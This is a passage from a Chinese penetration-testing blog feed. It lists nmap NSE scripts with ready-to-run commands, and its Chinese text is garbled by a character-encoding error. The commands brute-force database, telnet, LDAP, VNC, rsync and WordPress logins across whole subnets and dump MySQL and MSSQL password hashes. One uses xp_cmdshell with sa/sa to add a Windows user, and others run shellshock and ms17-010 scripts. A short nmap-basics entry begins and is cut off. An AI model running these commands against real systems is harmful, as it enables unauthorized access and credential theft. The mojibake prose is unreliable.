æ—ç«™æŸ¥è¯¢,ç›®æµ‹äº†ä¸€ä¸‹è„šæœ¬,ç”¨çš„ip2hostsçš„æ¥å£,ä¸è¿‡è¯¥æ¥å£ä¼¼ä¹æ—©å·²åœç”¨,å¦‚æœæƒ³ç»§ç»­ç”¨,å¯è‡ªè¡Œåˆ°è„šæœ¬é‡ŒæŠŠæ¥å£éƒ¨åˆ†çš„ä»£ç æ”¹æ‰</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p80 â€“script hostmap-ip2hosts.nse 192.168.3.23</span></span><br></pre></td></tr></table></figure><h3 id="å’Œå„ç§æ•°æ®åº“ç›¸å…³çš„æ‰«æè„šæœ¬"><a href="#å’Œå„ç§æ•°æ®åº“ç›¸å…³çš„æ‰«æè„šæœ¬" class="headerlink" title="å’Œå„ç§æ•°æ®åº“ç›¸å…³çš„æ‰«æè„šæœ¬:"></a>å’Œå„ç§æ•°æ®åº“ç›¸å…³çš„æ‰«æè„šæœ¬:</h3><p>informix-brute.nse informixçˆ†ç ´è„šæœ¬</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 9088 â€“script informix-brute.nse 192.168.3.23</span></span><br></pre></td></tr></table></figure><p>mysql-empty-password.nse mysql æ‰«ærootç©ºå¯†ç </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql-<span class="literal">empty</span>-password.nse mysql æ‰«ærootç©ºå¯†ç </span><br></pre></td></tr></table></figure><p>mysql-brute.nse mysql rootå¼±å£ä»¤ç®€å•çˆ†ç ´</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 3306 â€“script mysql-brute.nse -v 192.168.3.23</span></span><br></pre></td></tr></table></figure><p>mysql-dump-hashes.nse å¯¼å‡ºmysqlä¸­æ‰€æœ‰ç”¨æˆ·çš„hash</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 3306 â€“script mysql-dump-hashes â€“script-args=â€™username=root,password=rootâ€™ 192.168.3.23</span></span><br></pre></td></tr></table></figure><p>mysql-vuln-cve2012-2122.nse Mysqlèº«ä»½è®¤è¯æ¼æ´[MariaDB and MySQL 5.1.61,5.2.11, 5.3.5, 5.5.22],åˆ©ç”¨æ¡ä»¶æœ‰äº›è‹›åˆ» [éœ€è¦ç›®æ ‡çš„mysqlæ˜¯è‡ªå·±æºç ç¼–è¯‘å®‰è£…çš„,è¿™æ ·çš„æˆåŠŸç‡ç›¸å¯¹è¾ƒé«˜]</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -p <span class="number">3306</span> â€“script mysql-vuln-cve<span class="number">2012-2122</span>.nse -v <span class="number">192.168.3.23</span></span><br></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p <span class="number">445</span> â€“script ms-sql-<span class="literal">info</span>.nse -v <span class="number">203.124.11.0</span>/<span class="number">24</span> ms-sql-<span class="literal">info</span>.nse æ‰«æCæ®µmssql</span><br></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -p <span class="number">1433</span> â€“script ms-sql-info.nse â€“script-args mssql.<span class="keyword">instance</span>-port=<span class="number">1433</span> -v <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>ms-sql-empty-password.nse æ‰«æmssql saç©ºå¯†ç </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -p <span class="number">1433</span> â€“script ms-<span class="keyword">sql</span>-empty-<span class="keyword">password</span>.nse -v <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>ms-sql-brute.nse saå¼±å£ä»¤çˆ†ç ´</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 1433 â€“script ms-sql-brute.nse -v 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>ms-sql-xp-cmdshell.nse åˆ©ç”¨xp_cmdshell,è¿œç¨‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -p 1433 â€“script ms-sql-xp-cmdshell â€“script-<span class="keyword">args</span> mssql.username=<span class="keyword">sa</span>,mssql.password=<span class="keyword">sa</span>,ms-sql-xp-cmdshell.cmd=â€œ<span class="keyword">net</span> user <span class="keyword">test</span> <span class="keyword">test</span> /addâ€ 192.168.3.0/24</span><br></pre></td></tr></table></figure><p>ms-sql-dump-hashes.nse å¯¼å‡ºmssqlä¸­æ‰€æœ‰çš„æ•°æ®åº“ç”¨æˆ·åŠå¯†ç hash</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 1433 â€“script ms-sql-dump-hashes -v 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>pgsql-brute.nse å°è¯•çˆ†ç ´postgresql</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 5432 â€“script pgsql-brute -v 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>oracle-brute-stealth.nse å°è¯•çˆ†ç ´oracle</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap â€“script oracle-brute-stealth -p 1521 â€“script-args oracle-brute-stealth.sid=ORCL -v 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>oracle-brute.nse</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap â€“script oracle-brute -p 1521 â€“script-args oracle-brute.sid=ORCL -v 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>mongodb-brute.nse å°è¯•çˆ†ç ´mongdb</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 27017 â€“script mongodb-brute 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>redis-brute.nse redisçˆ†ç ´</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 6379 â€“script redis-brute.nse 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><h3 id="å’Œsnmpç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬"><a href="#å’Œsnmpç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬" class="headerlink" title="å’Œsnmpç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬:"></a>å’Œsnmpç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬:</h3><p>snmp-brute.nse çˆ†ç ´Cæ®µçš„snmp</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -<span class="keyword">sU</span> â€“script snmp-brute â€“script-<span class="keyword">args</span> snmp-brute.communitiesdb=user.txt 192.168.3.0/24</span><br></pre></td></tr></table></figure><h3 id="å’Œtelnetç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬"><a href="#å’Œtelnetç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬" class="headerlink" title="å’Œtelnetç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬:"></a>å’Œtelnetç›¸å…³çš„ä¸€äº›æ‰«æè„šæœ¬:</h3><p>telnet-brute.nse ç®€å•çˆ†ç ´telnet</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 23 â€“script telnet-brute â€“script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><h3 id="å’ŒldapæœåŠ¡ç›¸å…³çš„ä¸€äº›åˆ©ç”¨è„šæœ¬"><a href="#å’ŒldapæœåŠ¡ç›¸å…³çš„ä¸€äº›åˆ©ç”¨è„šæœ¬" class="headerlink" title="å’ŒldapæœåŠ¡ç›¸å…³çš„ä¸€äº›åˆ©ç”¨è„šæœ¬:"></a>å’ŒldapæœåŠ¡ç›¸å…³çš„ä¸€äº›åˆ©ç”¨è„šæœ¬:</h3><p>ldap-brute.nse ç®€å•çˆ†ç ´ldap</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">nmap</span> -<span class="keyword">p</span> <span class="number">389</span> â€“script ldap-brute â€“script-<span class="keyword">args</span> ldap.base=â€™â€œ<span class="keyword">cn</span>=users,dc=cqure,dc=netâ€â€˜ <span class="number">192.168</span>.<span class="number">3.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><h3 id="å’Œå„ç±»webä¸­é—´ä»¶-webé›†æˆç¯å¢ƒç›¸å…³çš„ä¸€äº›åˆ©ç”¨è„šæœ¬"><a href="#å’Œå„ç±»webä¸­é—´ä»¶-webé›†æˆç¯å¢ƒç›¸å…³çš„ä¸€äº›åˆ©ç”¨è„šæœ¬" class="headerlink" title="å’Œå„ç±»webä¸­é—´ä»¶,webé›†æˆç¯å¢ƒç›¸å…³çš„ä¸€äº›åˆ©ç”¨è„šæœ¬:"></a>å’Œå„ç±»webä¸­é—´ä»¶,webé›†æˆç¯å¢ƒç›¸å…³çš„ä¸€äº›åˆ©ç”¨è„šæœ¬:</h3><p>xmpp-brute.nse xmppçˆ†ç ´</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 5222 â€“script xmpp-brute.nse 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>http-iis-short-name-brute.nse çŸ­æ–‡ä»¶æ‰«æ</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p80 â€“script http-iis-short-name-brute.nse 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>http-iis-webdav-vuln.nse iis 5.0 /6.0 webadvå†™</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap â€“script http-iis-webdav-vuln.nse -p<span class="number">80,8080 192</span>.<span class="number">168.3.0/24</span></span><br></pre></td></tr></table></figure><p>http-shellshock.nse bashè¿œç¨‹æ‰§è¡Œ</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">nmap</span> -sV -<span class="keyword">p</span>- â€“script http-shellshock â€“script-<span class="keyword">args</span> uri=/cgi-bin/bin,cmd=<span class="keyword">ls</span> <span class="number">192.168</span>.<span class="number">3.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>http-svn-info.nse æ¢æµ‹ç›®æ ‡svn</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap â€“script http-svn-info 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>http-drupal-enum.nse å…¶å®å¯¹äºè¿™ç±»çš„å¼€æºç¨‹åº,æˆ‘ä»¬æ ¹æœ¬æ²¡å¿…è¦ç”¨nmap,å› ä¸ºæå¤šäº†,å·®ä¸å¤šä¸€çœ¼å°±èƒ½çœ‹å‡ºæ¥</p><p>http-wordpress-brute.nse</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">nmap</span> -p80 -sV â€“script http-wordpress-brute â€“script-<span class="keyword">args</span> â€˜userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.<span class="built_in">hostname</span>=domain.<span class="keyword">com</span>,http-wordpress-brute.threads=<span class="number">3</span>,brute.firstonly=trueâ€™ <span class="number">192.168</span>.<span class="number">3.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>http-backup-finder.nse æ‰«æç›®æ ‡ç½‘ç«™å¤‡ä»½</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p80 â€“script=http-backup-finder 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>http-vuln-cve2015-1635.nse iis6.0è¿œç¨‹ä»£ç æ‰§è¡Œ</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -sV â€“script http-vuln-cve* â€“script-args uri=â€™<span class="regexp">/anotheruri/</span>â€™ <span class="number">192.168</span>.<span class="number">3.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><h3 id="è·Ÿvpnç›¸å…³çš„ä¸€äº›åˆ©ç”¨è„šæœ¬"><a href="#è·Ÿvpnç›¸å…³çš„ä¸€äº›åˆ©ç”¨è„šæœ¬" class="headerlink" title="è·Ÿvpnç›¸å…³çš„ä¸€äº›åˆ©ç”¨è„šæœ¬"></a>è·Ÿvpnç›¸å…³çš„ä¸€äº›åˆ©ç”¨è„šæœ¬</h3><p>pptp-version.nse è¯†åˆ«ç›®æ ‡pptpç‰ˆæœ¬</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 1723 â€“script pptp-version.nse 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><h3 id="smbæ¼æ´æ£€æµ‹è„šæœ¬é›†"><a href="#smbæ¼æ´æ£€æµ‹è„šæœ¬é›†" class="headerlink" title="smbæ¼æ´æ£€æµ‹è„šæœ¬é›†:"></a>smbæ¼æ´æ£€æµ‹è„šæœ¬é›†:</h3><ul><li>smb-vuln-ms08-067.nse</li><li>smb-vuln-ms10-054.nse</li><li>smb-vuln-ms10-061.nse</li><li>smb-vuln-ms17-010.nse smbè¿œç¨‹æ‰§è¡Œ</li></ul><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p445 â€“script smb-vuln-ms17-010.nse 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><h3 id="æ£€æµ‹å†…ç½‘å—…æ¢"><a href="#æ£€æµ‹å†…ç½‘å—…æ¢" class="headerlink" title="æ£€æµ‹å†…ç½‘å—…æ¢"></a>æ£€æµ‹å†…ç½‘å—…æ¢</h3><p>sniffer-detect.nse</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -sn -Pn â€“script sniffer-detect.nse 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><h3 id="å…¶å®ƒçš„ä¸€äº›è¾…åŠ©æ€§è„šæœ¬"><a href="#å…¶å®ƒçš„ä¸€äº›è¾…åŠ©æ€§è„šæœ¬" class="headerlink" title="å…¶å®ƒçš„ä¸€äº›è¾…åŠ©æ€§è„šæœ¬:"></a>å…¶å®ƒçš„ä¸€äº›è¾…åŠ©æ€§è„šæœ¬:</h3><p>rsync-brute.nse çˆ†ç ´ç›®æ ‡çš„rsync</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -p <span class="number">873</span> â€“script rsync-brute â€“script-args â€˜rsync-brute.<span class="keyword">module</span>=wwwâ€™ <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>rlogin-brute.nse çˆ†ç ´ç›®æ ‡çš„rlogin</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 513 â€“script rlogin-brute 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>vnc-brute.nse çˆ†ç ´ç›®æ ‡çš„vnc</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap â€“script vnc-brute -p 5900 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>pcanywhere-brute.nse çˆ†ç ´pcanywhere</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -p 5631 â€“script=pcanywhere-brute 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>nessus-brute.nse çˆ†ç ´nessus,è²Œä¼¼ç°åœ¨å·²ç»ä¸æ˜¯1241ç«¯å£äº†,å®åœ¨æ˜¯å¤ªè€äº†,ç›´æ¥å¿½ç•¥å§</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap â€“script nessus-brute -p 1241 192.168.3.0/24</span></span><br></pre></td></tr></table></figure><p>nexpose-brute.nse çˆ†ç ´nexpose</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap â€“script nexpose-brute -p 3780 192.168.0.0/24</span></span><br></pre></td></tr></table></figure><p>shodan-api.nse é…åˆshodanæ¥å£è¿›è¡Œæ‰«æ,å¦‚æœè‡ªå·±æ‰‹é‡Œæœ‰0day,è¿™ä¸ªå¨åŠ›è¿˜æ˜¯ä¸å¯å°è§‘çš„</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap â€“script shodan-api â€“script-args â€˜shodan-api.target=192.168.0.0/24,shodan-api.apikey=SHODANAPIKEYâ€™</span></span><br></pre></td></tr></table></figure><p>0x17 å°è¯•åˆ©ç”¨nmapä¸€å¥è¯è¿›è¡Œç›®æ ‡Cæ®µå¸¸è§„æ¼æ´æ‰«æ</p><p>å®é™…æµ‹è¯•ä¸­,ä¼šéå¸¸çš„æ…¢,å¯èƒ½è·‘ä¸€ä¸ªè„šæœ¬éªŒè¯æ—¶é—´éƒ½è¦å¾ˆé•¿,å°¤å…¶åœ¨ä½ çš„vpså¸¦å®½ä¸æ˜¯å¾ˆè¶³,ç½‘ç»œåˆä¸æ€ä¹ˆå¥½çš„æ—¶å€™,é€Ÿåº¦å°±æ›´æ…¢äº†,æ‰€ä»¥è¿˜æ˜¯å»ºè®®å…ˆå¤§è‡´æ‰«ä¸€çœ¼ç›®æ ‡æœåŠ¡,ç„¶åå†å•ç‹¬é’ˆå¯¹æ€§çš„æ‰«,è¿™æ ·å®é™…çš„æˆåŠŸç‡å¯èƒ½ä¼šé«˜å¾ˆå¤š,æ¯•ç«Ÿ,ä¸æ˜¯åƒmasscanæˆ–è€…zampè¿™ç§åŸºäºæ— çŠ¶æ€çš„æ‰«æ:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nmap -sT -Pn -v â€“script dns-<span class="type">zone</span>-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010<span class="number">-4221.</span>nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-<span class="type">name</span>-brute.nse,http-put.nse,http-php-<span class="keyword">version</span>.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-<span class="keyword">version</span>.nse,memcached-<span class="keyword">info</span>.nse,mongodb-<span class="keyword">info</span>.nse,msrpc-enum.nse,ms-<span class="keyword">sql</span>-<span class="keyword">info</span>.nse,mysql-<span class="keyword">info</span>.nse,nrpe-enum.nse,pptp-<span class="keyword">version</span>.nse,redis-<span class="keyword">info</span>.nse,rpcinfo.nse,samba-vuln-cve<span class="number">-2012</span>â€“<span class="number">1182.</span>nse,smb-vuln-ms08<span class="number">-067.</span>nse,smb-vuln-ms17<span class="number">-010.</span>nse,snmp-<span class="keyword">info</span>.nse,sshv1.nse,xmpp-<span class="keyword">info</span>.nse,tftp-enum.nse,teamspeak2-<span class="keyword">version</span>.nse <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>å°è¯•åˆ©ç”¨nmapä¸€å¥è¯è¿›è¡Œç›®æ ‡Cæ®µå¼±å£ä»¤çˆ†ç ´,è¿˜æ˜¯ä¸Šé¢çš„é—®é¢˜,éªŒè¯ä¸€ä¸ªæ¼æ´éƒ½è¦é‚£ä¹ˆä¹…,æ›´ä¸è¦è¯´è·‘å®Œä¸€ä¸ªå¼±å£ä»¤å­—å…¸,nmapé»˜è®¤çš„å¼±å£ä»¤å­—å…¸å¤§æ¦‚æ˜¯5000å·¦å³,ä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªç”¨æˆ·åå°±è¦è·‘å¤§æ¦‚5000æ¬¡,ä¼°è®¡ä½ vpså¸¦å®½å†å°ç‚¹å„¿çš„è¯,è¿™ä¸ªå°±æ²¡ä»€ä¹ˆè°±äº†,æ¯•ç«Ÿæˆ‘ä»¬æ˜¯åœ¨å…¬ç½‘,ä¸æ˜¯åœ¨å†…ç½‘,æ‰€ä»¥,è¿˜æ˜¯å»ºè®®æœ€å¥½ä¸è¦åŒæ—¶åŠ è½½å¾ˆå¤šä¸ªå¼±å£ä»¤çˆ†ç ´è„šæœ¬,å¦‚æœå®åœ¨æ²¡åŠæ³•å¿…é¡»çˆ†ç ´,å¯ä»¥å¤šèŠ±ç‚¹å„¿æ—¶é—´,å»æœé›†ç›®æ ‡æœ‰ä»·å€¼çš„ç”¨æˆ·å,ä»¥æ­¤å°½å¯èƒ½æé«˜è‡ªå·±çš„å‘½ä¸­ç‡:</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># nmap -sT -v -Pn â€“script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.0.0/24</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hacker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmapåŸºæœ¬ä½¿ç”¨</title>
      <link href="post/5820/"/>
      <url>post/5820/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>Nmap æ˜¯ä¸ªç«¯å£æ‰«æå™¨ï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥å‘ä¸€äº›æŒ‡å®š IP çš„ TCP æˆ– UDP ç«¯å£å‘é€å°åŒ…ï¼Œå¹¶æ£€æŸ¥æ˜¯å¦æœ‰å“åº”ã€‚å¦‚æœæœ‰çš„è¯ï¼Œè¿™æ„å‘³ç€ç«¯å£æ˜¯æ‰“å¼€çš„ï¼Œå› æ­¤ï¼Œç«¯å£ä¸Šè¿è¡Œç€æœåŠ¡</p><p>Nmapä»£è¡¨Network Mapperï¼Œæ˜¯ä¸€æ¬¾ç”¨äºç½‘ç»œæ¢ç´¢å’Œå®‰å…¨å®¡è®¡çš„å¼€æºå·¥å…·ï¼Œå®ƒä¸Kali Linuxæ ‡å‡†å…¼å®¹ï¼Œä½†ä¹Ÿå¯ç”¨äºWindowsï¼ŒOSXå’Œè®¸å¤šå…¶ä»–UNIXå¹³å°ã€‚Nmapè¿˜æœ‰ä¸€ä¸ªç§°ä¸ºZenmapçš„å›¾å½¢ç”¨æˆ·ç•Œé¢ã€‚</p><span id="more"></span><h4 id="æ‰“å¼€ç«¯å£æ‰«æå’Œæ“ä½œç³»ç»Ÿæ£€æµ‹"><a href="#æ‰“å¼€ç«¯å£æ‰«æå’Œæ“ä½œç³»ç»Ÿæ£€æµ‹" class="headerlink" title="æ‰“å¼€ç«¯å£æ‰«æå’Œæ“ä½œç³»ç»Ÿæ£€æµ‹"></a>æ‰“å¼€ç«¯å£æ‰«æå’Œæ“ä½œç³»ç»Ÿæ£€æµ‹</h4><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç¡®å®šæ´»åŠ¨ä¸»æœºï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sP <span class="number">192.168.0.0</span>-<span class="number">100</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åœ¨å…¶ä¸­ä¸€ä¸ªå®æ—¶ä¸»æœºä¸Šå¯åŠ¨å¸¦æœ‰æ“ä½œç³»ç»Ÿæ£€æµ‹çš„SYNæ‰«æ</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -<span class="built_in">sS</span> [<span class="built_in">IP</span>åœ°å€] -O</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨ä¸€ä¸ªå¼€æ”¾ç«¯å£æ‰«æå’Œç‰ˆæœ¬æ£€æµ‹</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV <span class="number">192.168.0.1</span> -<span class="keyword">A</span></span><br></pre></td></tr></table></figure><p>å°†-væ·»åŠ åˆ°å‘½ä»¤ä¸­æ—¶ï¼Œå¯ä»¥å¢åŠ å†—é•¿åº¦</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV <span class="number">192.168.0.13</span> -<span class="keyword">A</span> -v</span><br></pre></td></tr></table></figure><h4 id="æœåŠ¡å™¨æ˜¯å¦å“åº”-pingï¼Œæˆ–è€…æœåŠ¡å™¨æ˜¯å¦æ‰“å¼€"><a href="#æœåŠ¡å™¨æ˜¯å¦å“åº”-pingï¼Œæˆ–è€…æœåŠ¡å™¨æ˜¯å¦æ‰“å¼€" class="headerlink" title="æœåŠ¡å™¨æ˜¯å¦å“åº” pingï¼Œæˆ–è€…æœåŠ¡å™¨æ˜¯å¦æ‰“å¼€"></a>æœåŠ¡å™¨æ˜¯å¦å“åº” pingï¼Œæˆ–è€…æœåŠ¡å™¨æ˜¯å¦æ‰“å¼€</h4><p>ä½¿ç”¨-snå‚æ•°ï¼Œæˆ‘ä»¬è®© Nmap åªæ£€æŸ¥æ˜¯å¦æœåŠ¡å™¨å“åº” ICMP è¯·æ±‚ï¼ˆæˆ– pingï¼‰</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sn <span class="number">192.168.56.102</span></span><br></pre></td></tr></table></figure><h4 id="æ‰“å¼€äº†å“ªäº›ç«¯å£"><a href="#æ‰“å¼€äº†å“ªäº›ç«¯å£" class="headerlink" title="æ‰“å¼€äº†å“ªäº›ç«¯å£"></a>æ‰“å¼€äº†å“ªäº›ç«¯å£</h4><p>è°ƒç”¨ Nmap çš„æœ€ç®€æ–¹å¼ï¼Œå®ƒåªæŒ‡å®šç›®æ ‡ IPã€‚æ‰€åšçš„äº‹æƒ…æ˜¯å…ˆ ping æœåŠ¡å™¨ï¼Œå¦‚æœå®ƒå“åº”äº†ï¼ŒNmap ä¼šå‘ 1000 ä¸ª TCP ç«¯å£åˆ—è¡¨å‘é€æ¢é’ˆï¼Œæ¥è§‚å¯Ÿå“ªä¸ªç«¯å£å“åº”ï¼Œä¹‹åæŠ¥å‘Šå“åº”ç«¯å£çš„ç»“æœ</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span> <span class="number">192.168.56.102</span></span><br></pre></td></tr></table></figure><h4 id="Nmap-å‘æœåŠ¡å™¨è¯¢é—®æ­£åœ¨è¿è¡Œçš„æœåŠ¡çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”åŸºäºå®ƒçŒœæµ‹æ“ä½œç³»ç»Ÿ"><a href="#Nmap-å‘æœåŠ¡å™¨è¯¢é—®æ­£åœ¨è¿è¡Œçš„æœåŠ¡çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”åŸºäºå®ƒçŒœæµ‹æ“ä½œç³»ç»Ÿ" class="headerlink" title="Nmap 